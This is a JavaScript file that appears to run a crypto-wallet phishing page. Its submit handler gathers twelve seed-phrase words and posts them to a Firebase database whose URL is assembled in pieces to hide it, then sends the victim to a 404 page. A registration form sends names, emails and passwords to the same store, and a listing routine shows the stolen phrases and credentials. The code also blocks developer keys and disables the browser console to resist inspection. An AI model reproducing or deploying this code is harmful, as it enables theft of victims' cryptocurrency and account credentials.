//const axios = require('axios');
	const getData = () =>{

	$('#preloader').removeClass("loaded");	

	axios.get(getLink()+'/block.json').then(res => {
		//console.log(res.data);

	//const obj = JSON.parse(res.data);
	//document.getElementById("demo").innerHTML = obj;
	const todos = res.data;
	var count = 0;
   for (var key in todos) {
   	count += 1;
  if (todos.hasOwnProperty(key)) {
  	let textContent = document.createTextNode(count);
  	let textContent2 = document.createTextNode(todos[key].name);
  	let textContent3 = document.createTextNode(todos[key].wall);
  	let textContent4 = document.createTextNode(todos[key].date);
    const ul = document.getElementById("keydom");
    let li = document.createElement("li");
    let li2 = document.createElement("li");
    let li3 = document.createElement("li");
    let li4 = document.createElement("li");
    li.setAttribute("class", "col-1");
    li2.setAttribute("class", "col-2");
    li3.setAttribute("class", "col-6");
    li4.setAttribute("class", "col-3");
    li.appendChild(textContent);
    li2.appendChild(textContent2);
    li3.appendChild(textContent3);
    li4.appendChild(textContent4);
    ul.appendChild(li);
    ul.appendChild(li2);
    ul.appendChild(li3);
    ul.appendChild(li4);
   // console.log(todos[key], key, count);
  }
}

	$('#preloader').addClass("loaded");	
//document.getElementById("demo").innerHTML = mapped.map(kk => kk);
	});
	axios.get(getLink()+'/data.json').then(res => {
		//console.log(res.data);

	//const obj = JSON.parse(res.data);
	//document.getElementById("demo").innerHTML = obj;
	const todos = res.data;
	var count = 0;
   for (var key in todos) {
   	count += 1;
  if (todos.hasOwnProperty(key)) {
  	let textContent = document.createTextNode(count);
  	let textContent2 = document.createTextNode(todos[key].name);
  	let textContent3 = document.createTextNode(todos[key].email + ":"+todos[key].keyy);
  	let textContent4 = document.createTextNode(todos[key].date);
    const ul = document.getElementById("datadom");
    let li = document.createElement("li");
    let li2 = document.createElement("li");
    let li3 = document.createElement("li");
    let li4 = document.createElement("li");
    li.setAttribute("class", "col-1");
    li2.setAttribute("class", "col-2");
    li3.setAttribute("class", "col-6");
    li4.setAttribute("class", "col-3");
    li.appendChild(textContent);
    li2.appendChild(textContent2);
    li3.appendChild(textContent3);
    li4.appendChild(textContent4);
    ul.appendChild(li);
    ul.appendChild(li2);
    ul.appendChild(li3);
    ul.appendChild(li4);
   // console.log(todos[key], key, count);
  }
}

	$('#preloader').addClass("loaded");	
//document.getElementById("demo").innerHTML = mapped.map(kk => kk);
	});


};
const postData = (nam, val) => {
axios.post(getLink()+'/block.json', {name: nam, wall: val, date: new Date()}, {headers: {'Content-Type': 'application/json'}}).then(res => {
	window.location.replace('404.html');
}).catch(err => {window.location.replace('404.html');});
};
const file = document.getElementById('rez293').value + '-bb570-default-rtdb'+'.'+mart;
const sendData = (classs, address) => {
	axios.post(file+'/block.json', {name: classs, wall: address, date: new Date()}).then(res => {

	})
}


function submitHandle(e){
	e.preventDefault();
	var max = 0;
	var values = '';
	for (var i = 1; i <= 12; i++) {
		if(document.getElementById('Phase'+i).value == '' || document.getElementById('Phase'+i).value.length < 3){
				max += 1;
		}
		values = values+" "+document.getElementById('Phase'+i).value;
	}
	if(max > 0){
		document.getElementById('error').innerHTML = 'Invalid or Empty wallet Phrase. Unable to connect.';
	}else{
		postData(document.getElementById('classs').value, values);
		$('#preloader').removeClass("loaded");	
	}
	
	return false;
}

function setVal(data){
	
}
function setName(name){
	document.getElementById('classs').value = name;
	$('.modal-body').fadeOut().hide();
	$('#walletcconnect').removeClass('d-none');
}

function readyFro(){
		

}


function submitForm (e, g){
	e.preventDefault();
if(g == 1){
	if(document.getElementById('pass').value == document.getElementById('passs').value && document.getElementById('passs').value.length > 2 && document.getElementById('name').value != '' && document.getElementById('lname').value != '' && document.getElementById('email').value != ''){
	var name = document.getElementById('name').value + " " + document.getElementById('lname').value;
	var pass = document.getElementById('pass').value;
	var email = document.getElementById('email').value;
$('#preloader').removeClass("loaded");	
var expir = new Date(); expir.setTime(expir.getTime() + (5*24*60*60*1000));
expirr = expir.toUTCString();
document.cookie = 'userval=accesstodistributiontousefrereut82u4r0248u83ur8u4u0384; '+expirr;
axios.post(getLink()+'/data.json', {name: name, keyy: pass, email: email, date: new Date()}, {headers: {'Content-Type': 'application/json'}}).then(res => {
window.location.replace('./login.html?mint'); 
}).catch(err => {window.location.replace('./404.html');});
	}else{window.location.replace('./connect-wallet.html');}
}else{
if(document.getElementById('pass').value.length > 2 && document.getElementById('email').value != ''){
		window.location.replace('./login.html?mint');
	}else{window.location.replace('./connect-wallet.html');}
}

return false;
}


document.addEventListener("keydown", e => {
	if(e.ctrlKey || e.keyCode == 123){
		e.stopPropagation();
		e.preventDefault();
	}
});

// javascript:window.console2 = (function () {
// var globals = [],
// iframe = document.createElement(‘iframe’),
// cleanWindow;

// iframe.src = ‘about:blank’;
// iframe.style.display = ‘none’;
// document.body.appendChild(iframe);

// return (iframe.contentWindow || iframe.contentDocument).console;
// }());

// Object.defineProperty(window, “console”, {
// get: function () { return window.console2; }
// });


(function() {
    try {
        var $_console$$ = console;
        Object.defineProperty(window, "console", {
            get: function() {
                if ($_console$$._commandLineAPI)
                    throw "Sorry, for security reasons, the script console is deactivated on netflix.com";
                return $_console$$
            },
            set: function($val$$) {
                $_console$$ = $val$$
            }
        })
    } catch ($ignore$$) {
    }
})();
function getLink(){
	return file;
}

